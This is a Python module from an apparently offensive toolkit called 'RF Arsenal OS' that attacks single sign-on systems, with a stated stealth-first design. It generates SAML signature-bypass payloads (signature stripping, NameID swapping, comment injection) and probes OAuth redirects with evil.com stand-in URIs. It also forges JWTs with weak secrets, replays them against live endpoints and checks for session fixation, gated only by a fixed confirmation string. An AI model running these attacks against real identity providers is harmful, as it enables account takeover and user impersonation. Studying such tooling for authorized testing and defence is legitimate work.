#!/usr/bin/env python3
"""
RF Arsenal OS - SSO/Identity Attacks Module
============================================

Professional SSO and identity security testing with stealth-first design.
Comprehensive testing for SAML, OAuth, Kerberos, and session management vulnerabilities.

CAPABILITIES:
- SAML signature bypass and injection attacks
- OAuth flow manipulation and token theft
- Kerberos attacks (AS-REP roasting simulation)
- Session fixation and hijacking detection
- JWT manipulation and key confusion
- Token replay and refresh token abuse

README COMPLIANCE:
- Stealth-First: Randomized timing, proxy support
- RAM-Only: All findings stored in memory only
- No Telemetry: Zero external data transmission
- Offline-First: SAML/JWT analysis works offline

Author: RF Arsenal Security Team
License: Authorized Security Testing Only
"""

import asyncio
import base64
import hashlib
import hmac
import json
import logging
import os
import random
import re
import secrets
import time
import urllib.parse
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple
from xml.etree import ElementTree

try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False

logger = logging.getLogger(__name__)


class SSOVulnType(Enum):
    """SSO vulnerability types"""
    # SAML
    SAML_SIGNATURE_BYPASS = "saml_signature_bypass"
    SAML_INJECTION = "saml_xml_injection"
    SAML_REPLAY = "saml_replay_attack"
    SAML_RECIPIENT_MISMATCH = "saml_recipient_mismatch"
    # OAuth
    OAUTH_OPEN_REDIRECT = "oauth_open_redirect"
    OAUTH_CODE_INJECTION = "oauth_code_injection"
    OAUTH_CSRF = "oauth_csrf"
    OAUTH_TOKEN_LEAK = "oauth_token_leakage"
    OAUTH_SCOPE_MANIPULATION = "oauth_scope_manipulation"
    # Session
    SESSION_FIXATION = "session_fixation"
    SESSION_HIJACKING = "session_hijacking_possible"
    SESSION_NOT_INVALIDATED = "session_not_invalidated_on_logout"
    WEAK_SESSION_ID = "weak_session_id"
    # JWT
    JWT_NONE_ALG = "jwt_none_algorithm"
    JWT_WEAK_SECRET = "jwt_weak_secret"
    JWT_KEY_CONFUSION = "jwt_key_confusion"
    JWT_EXPIRED_ACCEPTED = "jwt_expired_accepted"
    # Kerberos
    KERBEROS_ASREP_ROAST = "kerberos_asrep_roastable"
    KERBEROS_KERBEROAST = "kerberos_kerberoastable"
    KERBEROS_DELEGATION = "kerberos_unconstrained_delegation"
    # General
    MFA_BYPASS = "mfa_bypass_possible"
    PASSWORD_RESET_WEAKNESS = "password_reset_weakness"
    ACCOUNT_ENUMERATION = "account_enumeration"


class SeverityLevel(Enum):
    """Vulnerability severity levels"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "informational"


@dataclass
class SSOVulnerability:
    """Detected SSO vulnerability"""
    vuln_type: SSOVulnType
    severity: SeverityLevel
    target: str
    description: str = ""
    evidence: Optional[str] = None
    payload: Optional[str] = None
    remediation: str = ""
    confidence: float = 0.0
    cwe_id: Optional[str] = None
    timestamp: datetime = field(default_factory=datetime.now)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'type': self.vuln_type.value,
            'severity': self.severity.value,
            'target': self.target,
            'description': self.description,
            'evidence': self.evidence[:500] if self.evidence else None,
            'remediation': self.remediation,
            'confidence': self.confidence,
            'timestamp': self.timestamp.isoformat(),
        }


@dataclass
class SAMLAssertion:
    """Parsed SAML assertion"""
    raw: str
    issuer: Optional[str] = None
    subject: Optional[str] = None
    audience: Optional[str] = None
    conditions: Dict[str, str] = field(default_factory=dict)
    attributes: Dict[str, str] = field(default_factory=dict)
    signature_present: bool = False
    is_encrypted: bool = False


class SSOSecurityScanner:
    """
    SSO/Identity Security Scanner
    
    Tests:
    - SAML assertion attacks
    - OAuth flow vulnerabilities
    - Session management
    - JWT security
    
    README COMPLIANCE:
    - Stealth-First: Rate-limited requests
    - RAM-Only: No persistent storage
    - No Telemetry: Zero reporting
    """
    
    # SAML namespaces
    SAML_NS = {
        'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
        'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
        'ds': 'http://www.w3.org/2000/09/xmldsig#',
    }
    
    # Weak JWT secrets to test
    WEAK_JWT_SECRETS = [
        "secret", "password", "123456", "key", "jwt_secret",
        "your-256-bit-secret", "supersecret", "changeme",
    ]
    
    def __init__(self):
        """Initialize scanner"""
        self.vulnerabilities: List[SSOVulnerability] = []
        self.stats = defaultdict(int)
        self._authorized = False
        
        logger.info("SSOSecurityScanner initialized")
    
    def authorize(self, confirmation: str = "I_AUTHORIZE_SSO_TESTING") -> bool:
        """Authorize testing"""
        if confirmation == "I_AUTHORIZE_SSO_TESTING":
            self._authorized = True
            return True
        return False
    
    async def _make_request(
        self,
        url: str,
        method: str = "GET",
        data: Optional[Dict] = None,
        headers: Optional[Dict] = None,
        allow_redirects: bool = True,
    ) -> Tuple[Optional[int], Optional[str], Optional[Dict]]:
        """Make HTTP request"""
        if not AIOHTTP_AVAILABLE:
            return None, None, None
        
        try:
            timeout = aiohttp.ClientTimeout(total=30)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.request(
                    method, url,
                    data=data,
                    headers=headers,
                    allow_redirects=allow_redirects,
                    ssl=False,
                ) as response:
                    text = await response.text()
                    return response.status, text, dict(response.headers)
        except Exception as e:
            logger.debug(f"Request error: {e}")
            return None, None, None
    
    # =========================================================================
    # SAML SECURITY TESTING
    # =========================================================================
    
    def parse_saml_assertion(self, saml_b64: str) -> Optional[SAMLAssertion]:
        """Parse SAML assertion (offline)"""
        try:
            # Decode base64
            saml_xml = base64.b64decode(saml_b64).decode('utf-8')
            root = ElementTree.fromstring(saml_xml)
            
            assertion = SAMLAssertion(raw=saml_xml)
            
            # Find issuer
            issuer = root.find('.//saml:Issuer', self.SAML_NS)
            if issuer is not None:
                assertion.issuer = issuer.text
            
            # Find subject
            name_id = root.find('.//saml:NameID', self.SAML_NS)
            if name_id is not None:
                assertion.subject = name_id.text
            
            # Find audience
            audience = root.find('.//saml:Audience', self.SAML_NS)
            if audience is not None:
                assertion.audience = audience.text
            
            # Check for signature
            signature = root.find('.//ds:Signature', self.SAML_NS)
            assertion.signature_present = signature is not None
            
            # Find attributes
            for attr in root.findall('.//saml:Attribute', self.SAML_NS):
                name = attr.get('Name', '')
                value_elem = attr.find('saml:AttributeValue', self.SAML_NS)
                if value_elem is not None:
                    assertion.attributes[name] = value_elem.text or ''
            
            return assertion
        
        except Exception as e:
            logger.debug(f"Failed to parse SAML: {e}")
            return None
    
    def analyze_saml_security(self, saml_b64: str) -> List[SSOVulnerability]:
        """Analyze SAML assertion for vulnerabilities (offline)"""
        vulnerabilities = []
        
        assertion = self.parse_saml_assertion(saml_b64)
        if not assertion:
            return vulnerabilities
        
        # Check for missing signature
        if not assertion.signature_present:
            vuln = SSOVulnerability(
                vuln_type=SSOVulnType.SAML_SIGNATURE_BYPASS,
                severity=SeverityLevel.CRITICAL,
                target="SAML Assertion",
                description="SAML assertion not signed - can be forged",
                remediation="Require signed assertions, validate signatures",
                confidence=0.95,
                cwe_id="CWE-347",
            )
            vulnerabilities.append(vuln)
            self.vulnerabilities.append(vuln)
        
        # Check for XML injection patterns
        dangerous_patterns = ['<!ENTITY', '<!DOCTYPE', 'SYSTEM', 'PUBLIC']
        for pattern in dangerous_patterns:
            if pattern in assertion.raw:
                vuln = SSOVulnerability(
                    vuln_type=SSOVulnType.SAML_INJECTION,
                    severity=SeverityLevel.HIGH,
                    target="SAML Assertion",
                    description=f"SAML contains XML injection pattern: {pattern}",
                    evidence=f"Found: {pattern}",
                    remediation="Sanitize XML input, disable external entities",
                    confidence=0.9,
                    cwe_id="CWE-611",
                )
                vulnerabilities.append(vuln)
                self.vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def create_saml_signature_bypass_payloads(
        self,
        original_assertion: str,
        new_user: str,
    ) -> List[str]:
        """Create SAML signature bypass test payloads (offline)"""
        payloads = []
        
        try:
            saml_xml = base64.b64decode(original_assertion).decode('utf-8')
            
            # Payload 1: Remove signature entirely
            no_sig = re.sub(
                r'<ds:Signature[^>]*>.*?</ds:Signature>',
                '',
                saml_xml,
                flags=re.DOTALL
            )
            payloads.append(base64.b64encode(no_sig.encode()).decode())
            
            # Payload 2: Change NameID
            new_assertion = re.sub(
                r'(<saml:NameID[^>]*>)[^<]*(</saml:NameID>)',
                f'\\1{new_user}\\2',
                saml_xml
            )
            payloads.append(base64.b64encode(new_assertion.encode()).decode())
            
            # Payload 3: Comment injection
            comment_injection = saml_xml.replace(
                '</saml:NameID>',
                f'</saml:NameID><!--{new_user}-->'
            )
            payloads.append(base64.b64encode(comment_injection.encode()).decode())
            
        except Exception as e:
            logger.debug(f"Failed to create SAML payloads: {e}")
        
        return payloads
    
    # =========================================================================
    # OAUTH SECURITY TESTING
    # =========================================================================
    
    async def test_oauth_security(
        self,
        auth_endpoint: str,
        client_id: str,
        redirect_uri: str,
    ) -> List[SSOVulnerability]:
        """Test OAuth implementation for vulnerabilities"""
        vulnerabilities = []
        
        if not self._authorized:
            return vulnerabilities
        
        # Test 1: Open redirect
        evil_uris = [
            "https://evil.com",
            f"{redirect_uri}/../../../evil.com",
            f"https://evil.com@{urllib.parse.urlparse(redirect_uri).netloc}",
            f"{redirect_uri}%00https://evil.com",
        ]
        
        for evil_uri in evil_uris:
            test_url = (
                f"{auth_endpoint}?client_id={client_id}"
                f"&redirect_uri={urllib.parse.quote(evil_uri)}"
                f"&response_type=code&scope=openid"
            )
            
            status, _, headers = await self._make_request(test_url, allow_redirects=False)
            
            if status in [301, 302, 303, 307] and headers:
                location = headers.get('Location', headers.get('location', ''))
                if 'evil.com' in location:
                    vuln = SSOVulnerability(
                        vuln_type=SSOVulnType.OAUTH_OPEN_REDIRECT,
                        severity=SeverityLevel.HIGH,
                        target=auth_endpoint,
                        description="OAuth allows redirect to external domain",
                        evidence=f"Redirected to: {location[:100]}",
                        payload=evil_uri,
                        remediation="Strictly validate redirect_uri against whitelist",
                        confidence=0.95,
                        cwe_id="CWE-601",
                    )
                    vulnerabilities.append(vuln)
                    self.vulnerabilities.append(vuln)
                    break
        
        # Test 2: Missing state parameter (CSRF)
        test_url = (
            f"{auth_endpoint}?client_id={client_id}"
            f"&redirect_uri={redirect_uri}"
            f"&response_type=code"
        )
        
        status, _, headers = await self._make_request(test_url, allow_redirects=False)
        
        if status in [301, 302, 303, 307] and headers:
            location = headers.get('Location', '')
            if 'code=' in location and 'state=' not in location:
                vuln = SSOVulnerability(
                    vuln_type=SSOVulnType.OAUTH_CSRF,
                    severity=SeverityLevel.MEDIUM,
                    target=auth_endpoint,
                    description="OAuth does not require state parameter",
                    remediation="Require and validate state parameter",
                    confidence=0.85,
                    cwe_id="CWE-352",
                )
                vulnerabilities.append(vuln)
                self.vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    # =========================================================================
    # SESSION SECURITY TESTING
    # =========================================================================
    
    async def test_session_security(
        self,
        login_url: str,
        logout_url: str,
        credentials: Dict[str, str],
    ) -> List[SSOVulnerability]:
        """Test session management security"""
        vulnerabilities = []
        
        if not self._authorized:
            return vulnerabilities
        
        # Test 1: Session fixation
        # Get initial session
        status1, _, headers1 = await self._make_request(login_url)
        initial_cookies = headers1.get('Set-Cookie', '') if headers1 else ''
        
        # Login
        status2, _, headers2 = await self._make_request(
            login_url, method="POST", data=credentials
        )
        
        post_login_cookies = headers2.get('Set-Cookie', '') if headers2 else ''
        
        # Check if session ID changed
        if initial_cookies and post_login_cookies:
            # Simple check - in real scenario would extract session ID
            if 'session' in initial_cookies.lower() and initial_cookies == post_login_cookies:
                vuln = SSOVulnerability(
                    vuln_type=SSOVulnType.SESSION_FIXATION,
                    severity=SeverityLevel.HIGH,
                    target=login_url,
                    description="Session ID not regenerated after login",
                    remediation="Regenerate session ID after authentication",
                    confidence=0.8,
                    cwe_id="CWE-384",
                )
                vulnerabilities.append(vuln)
                self.vulnerabilities.append(vuln)
        
        # Test 2: Session not invalidated on logout
        # This would require maintaining session state across requests
        
        return vulnerabilities
    
    def analyze_session_cookie(self, cookie_header: str) -> List[SSOVulnerability]:
        """Analyze session cookie for security issues (offline)"""
        vulnerabilities = []
        
        # Check for security flags
        cookie_lower = cookie_header.lower()
        
        if 'httponly' not in cookie_lower:
            vuln = SSOVulnerability(
                vuln_type=SSOVulnType.SESSION_HIJACKING,
                severity=SeverityLevel.MEDIUM,
                target="Session Cookie",
                description="Session cookie missing HttpOnly flag",
                remediation="Set HttpOnly flag on session cookies",
                confidence=0.95,
                cwe_id="CWE-1004",
            )
            vulnerabilities.append(vuln)
            self.vulnerabilities.append(vuln)
        
        if 'secure' not in cookie_lower:
            vuln = SSOVulnerability(
                vuln_type=SSOVulnType.SESSION_HIJACKING,
                severity=SeverityLevel.MEDIUM,
                target="Session Cookie",
                description="Session cookie missing Secure flag",
                remediation="Set Secure flag on session cookies",
                confidence=0.95,
                cwe_id="CWE-614",
            )
            vulnerabilities.append(vuln)
            self.vulnerabilities.append(vuln)
        
        if 'samesite' not in cookie_lower:
            vuln = SSOVulnerability(
                vuln_type=SSOVulnType.OAUTH_CSRF,
                severity=SeverityLevel.LOW,
                target="Session Cookie",
                description="Session cookie missing SameSite attribute",
                remediation="Set SameSite=Strict or SameSite=Lax",
                confidence=0.9,
            )
            vulnerabilities.append(vuln)
            self.vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    # =========================================================================
    # JWT SECURITY TESTING
    # =========================================================================
    
    def analyze_jwt(self, token: str) -> List[SSOVulnerability]:
        """Analyze JWT for vulnerabilities (offline)"""
        vulnerabilities = []
        
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return vulnerabilities
            
            # Decode header
            header_b64 = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64))
            
            # Decode payload
            payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            
            algorithm = header.get('alg', '')
            
            # Check for none algorithm
            if algorithm.lower() == 'none':
                vuln = SSOVulnerability(
                    vuln_type=SSOVulnType.JWT_NONE_ALG,
                    severity=SeverityLevel.CRITICAL,
                    target="JWT",
                    description="JWT uses 'none' algorithm - no signature verification",
                    remediation="Reject tokens with alg=none",
                    confidence=0.99,
                    cwe_id="CWE-347",
                )
                vulnerabilities.append(vuln)
                self.vulnerabilities.append(vuln)
            
            # Check for weak algorithms
            weak_algs = ['HS256', 'HS384', 'HS512']  # Symmetric, can be brute-forced
            if algorithm in weak_algs:
                vuln = SSOVulnerability(
                    vuln_type=SSOVulnType.JWT_WEAK_SECRET,
                    severity=SeverityLevel.INFO,
                    target="JWT",
                    description=f"JWT uses symmetric algorithm: {algorithm}",
                    evidence="Vulnerable to secret brute-force",
                    remediation="Use asymmetric algorithms (RS256, ES256)",
                    confidence=0.7,
                )
                vulnerabilities.append(vuln)
                self.vulnerabilities.append(vuln)
            
            # Check for expired token
            exp = payload.get('exp')
            if exp and datetime.fromtimestamp(exp) < datetime.now():
                vuln = SSOVulnerability(
                    vuln_type=SSOVulnType.JWT_EXPIRED_ACCEPTED,
                    severity=SeverityLevel.LOW,
                    target="JWT",
                    description="JWT token is expired",
                    evidence=f"Expired: {datetime.fromtimestamp(exp)}",
                    remediation="Implement proper token expiration validation",
                    confidence=0.95,
                )
                vulnerabilities.append(vuln)
                self.vulnerabilities.append(vuln)
            
        except Exception as e:
            logger.debug(f"JWT analysis error: {e}")
        
        return vulnerabilities
    
    async def test_jwt_weak_secret(
        self,
        token: str,
        endpoint: str,
    ) -> List[SSOVulnerability]:
        """Test JWT for weak secret (requires authorization)"""
        vulnerabilities = []
        
        if not self._authorized:
            return vulnerabilities
        
        try:
            parts = token.split('.')
            header_b64 = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64))
            payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            
            algorithm = header.get('alg', 'HS256')
            
            if not algorithm.startswith('HS'):
                return vulnerabilities
            
            for secret in self.WEAK_JWT_SECRETS:
                # Re-sign with weak secret
                new_header = base64.urlsafe_b64encode(
                    json.dumps(header).encode()
                ).rstrip(b'=').decode()
                new_payload = base64.urlsafe_b64encode(
                    json.dumps(payload).encode()
                ).rstrip(b'=').decode()
                
                message = f"{new_header}.{new_payload}".encode()
                
                if algorithm == 'HS256':
                    sig = hmac.new(secret.encode(), message, hashlib.sha256).digest()
                elif algorithm == 'HS384':
                    sig = hmac.new(secret.encode(), message, hashlib.sha384).digest()
                else:
                    sig = hmac.new(secret.encode(), message, hashlib.sha512).digest()
                
                sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
                test_token = f"{new_header}.{new_payload}.{sig_b64}"
                
                # Test token
                status, _, _ = await self._make_request(
                    endpoint,
                    headers={'Authorization': f'Bearer {test_token}'}
                )
                
                if status and status < 400:
                    vuln = SSOVulnerability(
                        vuln_type=SSOVulnType.JWT_WEAK_SECRET,
                        severity=SeverityLevel.CRITICAL,
                        target=endpoint,
                        description=f"JWT signed with weak secret: '{secret}'",
                        remediation="Use strong, randomly generated secrets",
                        confidence=0.99,
                        cwe_id="CWE-326",
                    )
                    vulnerabilities.append(vuln)
                    self.vulnerabilities.append(vuln)
                    break
        
        except Exception as e:
            logger.debug(f"JWT test error: {e}")
        
        return vulnerabilities
    
    def get_report(self, format: str = "json") -> str:
        """Generate report"""
        if format == "json":
            return json.dumps({
                'scan_time': datetime.now().isoformat(),
                'vulnerabilities': [v.to_dict() for v in self.vulnerabilities],
            }, indent=2)
        else:
            lines = [
                "=" * 70,
                "RF ARSENAL OS - SSO/IDENTITY SECURITY REPORT",
                "=" * 70,
                f"Total Vulnerabilities: {len(self.vulnerabilities)}",
                "",
            ]
            
            for vuln in self.vulnerabilities:
                lines.append(f"[{vuln.severity.value.upper()}] {vuln.vuln_type.value}")
                lines.append(f"  Target: {vuln.target}")
                lines.append(f"  {vuln.description}")
            
            return "\n".join(lines)
    
    def clear_results(self):
        """Clear results from RAM"""
        self.vulnerabilities = []


def create_sso_scanner() -> SSOSecurityScanner:
    """Factory function"""
    return SSOSecurityScanner()


__all__ = [
    'SSOSecurityScanner',
    'SSOVulnerability',
    'SSOVulnType',
    'SAMLAssertion',
    'SeverityLevel',
    'create_sso_scanner',
]

__version__ = '1.0.0'
